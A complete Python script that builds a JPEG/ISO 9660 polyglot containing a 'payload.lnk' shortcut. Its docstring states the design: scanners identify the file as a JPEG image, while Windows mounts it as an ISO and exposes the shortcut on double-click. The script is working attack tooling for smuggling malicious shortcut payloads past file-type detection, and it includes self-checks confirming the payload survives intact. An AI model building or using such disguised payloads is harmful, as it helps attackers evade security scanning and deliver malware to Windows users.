#!/usr/bin/env python3
"""
build_v3.py — JPEG + ISO 9660 (containing payload.lnk) polyglot.

ISO 9660 reserves the first 32 KiB (0x8000 bytes) as the "System Area",
explicitly defined as ignored by the format. We build a valid ISO
containing payload.lnk, then overlay the System Area with a padded JPEG.
The result:

  - libmagic / scanners read offset 0 → "JPEG image data"
  - Windows (or pycdlib / mount -o loop) reads offset 0x8000+ → valid
    ISO 9660 → payload.lnk visible. Double-click on Windows mounts
    the .iso file and shows the shortcut.
"""
from __future__ import annotations

import argparse
import io
import sys
from pathlib import Path

import pycdlib


SYSTEM_AREA_SIZE = 32768  # 0x8000


def build_iso_with_lnk(lnk_path: Path, volume_id: str = "POLYGLOT") -> bytes:
    """Return raw bytes of an ISO 9660 image containing payload.lnk."""
    iso = pycdlib.PyCdlib()
    iso.new(joliet=3, vol_ident=volume_id)

    lnk_bytes = lnk_path.read_bytes()
    # ISO 9660 Level 1 has restrictive naming: 8.3, uppercase, ; version.
    # Add a Joliet name for the real "payload.lnk".
    iso.add_fp(
        io.BytesIO(lnk_bytes), len(lnk_bytes),
        iso_path="/PAYLOAD.LNK;1",
        joliet_path="/payload.lnk",
    )

    buf = io.BytesIO()
    iso.write_fp(buf)
    iso.close()
    return buf.getvalue()


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("--jpg", required=True, type=Path,
                    help="cover JPEG (must be ≤ 32768 bytes)")
    ap.add_argument("--lnk", required=True, type=Path,
                    help="payload .lnk to embed in the ISO")
    ap.add_argument("--out", required=True, type=Path)
    args = ap.parse_args()

    jpg = args.jpg.read_bytes()
    if not jpg.startswith(b"\xFF\xD8\xFF"):
        print(f"[error] {args.jpg} doesn't start with JPEG SOI", file=sys.stderr)
        return 2
    if len(jpg) > SYSTEM_AREA_SIZE:
        print(f"[error] JPEG is {len(jpg)} bytes, > {SYSTEM_AREA_SIZE} "
              f"System Area limit", file=sys.stderr)
        return 2
    print(f"[jpg]   {args.jpg} : {len(jpg)} bytes "
          f"(fits in {SYSTEM_AREA_SIZE}-byte System Area, "
          f"{SYSTEM_AREA_SIZE - len(jpg)} bytes padding)")

    lnk = args.lnk.read_bytes()
    if not lnk.startswith(b"\x4C\x00\x00\x00"):
        print(f"[error] {args.lnk} doesn't start with LNK signature",
              file=sys.stderr)
        return 2
    print(f"[lnk]   {args.lnk} : {len(lnk)} bytes")

    iso_bytes = build_iso_with_lnk(args.lnk)
    print(f"[iso]   built {len(iso_bytes)} bytes "
          f"(System Area = bytes 0..{SYSTEM_AREA_SIZE-1}, currently zero-filled)")

    # Sanity: confirm the System Area is zero-filled before we overlay.
    sa = iso_bytes[:SYSTEM_AREA_SIZE]
    nonzero = sum(1 for b in sa if b != 0)
    print(f"[iso]   System Area pre-overlay nonzero bytes: {nonzero} "
          f"(pycdlib writes zeros)")

    # Overlay: replace bytes [0..32KiB) with JPEG + zero padding.
    polyglot = bytearray(iso_bytes)
    polyglot[:len(jpg)] = jpg
    # bytes [len(jpg)..32768) are left as the original zeros — fine,
    # since the ISO format requires nothing here, and a JPEG decoder
    # stops at EOI marker, so the trailing zeros are ignored.

    args.out.parent.mkdir(parents=True, exist_ok=True)
    args.out.write_bytes(bytes(polyglot))
    print(f"[out]   wrote {args.out} : {len(polyglot)} bytes")

    # Self-check 1: JPEG SOI still at offset 0.
    assert polyglot[:3] == b"\xFF\xD8\xFF", "JPEG SOI lost after overlay"
    print(f"[check] JPEG SOI present at offset 0")

    # Self-check 2: ISO 9660 PVD signature at offset 0x8001..0x8006 = "CD001".
    pvd_marker = bytes(polyglot[0x8001:0x8006])
    if pvd_marker != b"CD001":
        print(f"[check] PVD marker missing: got {pvd_marker!r} at 0x8001",
              file=sys.stderr)
        return 3
    print(f"[check] PVD marker 'CD001' present at offset 0x8001")

    # Self-check 3: re-parse with pycdlib and confirm payload.lnk reachable.
    verify_iso = pycdlib.PyCdlib()
    verify_iso.open_fp(io.BytesIO(bytes(polyglot)))
    extracted = io.BytesIO()
    verify_iso.get_file_from_iso_fp(extracted, joliet_path="/payload.lnk")
    extracted_bytes = extracted.getvalue()
    verify_iso.close()
    if extracted_bytes != lnk:
        print(f"[check] payload.lnk content mismatch after round-trip "
              f"(extracted {len(extracted_bytes)} vs original {len(lnk)} bytes)",
              file=sys.stderr)
        return 4
    print(f"[check] payload.lnk round-trips through pycdlib: {len(extracted_bytes)} bytes OK")

    return 0


if __name__ == "__main__":
    sys.exit(main())
